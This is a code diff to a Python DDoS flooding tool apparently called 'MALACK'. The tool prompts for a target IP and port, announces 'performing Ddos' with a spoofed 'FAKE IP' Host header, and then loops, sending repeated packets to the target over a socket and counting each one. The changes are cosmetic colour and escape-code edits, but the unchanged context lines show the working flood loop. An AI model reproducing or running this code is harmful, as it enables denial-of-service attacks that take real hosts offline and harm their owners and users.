@@ -17,7 +17,7 @@ def DDoS():
         else:
             break;
     attack_num = 0
-    trget = str(input(Fore.RED + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
+    trget = str(input(Fore.LIGHTCYAN_EX + Style.BRIGHT + "ENTER IP OF THE HOST :  "))
     fake = '192.178.1.38'
     #port = 80( default http port is 80)
     while True:
@@ -29,11 +29,11 @@ def DDoS():
         else:
             break;
     print(f"performing Ddos on {trget} on PORT {port} using FAKE IP {fake} ")
-    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
+    print(Fore.BLUE + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect,you can restart the script and again enter the details correctly!!")
    # print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " Press CTRL + C and press Enter to Exit!")
     #print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
     time.sleep(4)
-    print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
+    print(Fore.LIGHTCYAN + Style.BRIGHT + "DDos starting in ~")
     print("seconds : 3")
     time.sleep(1)
     print("seconds : 2")
@@ -51,7 +51,7 @@ def DDoS():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print(f"{Fore.LIGHTMAGENTA_EX}[]  {Fore.LIGHTCYAN_EX}M A L A C K \033[103mSent massage\033[0m  \033["+ str(attack_num))
+                print(f"{Fore.LIGHTMAGENTA_EX}[]  {Fore.LIGHTCYAN_EX}M A L A C K \033[103mSent massage\033[0m  \033[47m"+ str(attack_num))
             except socket.error:
                 print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                 break
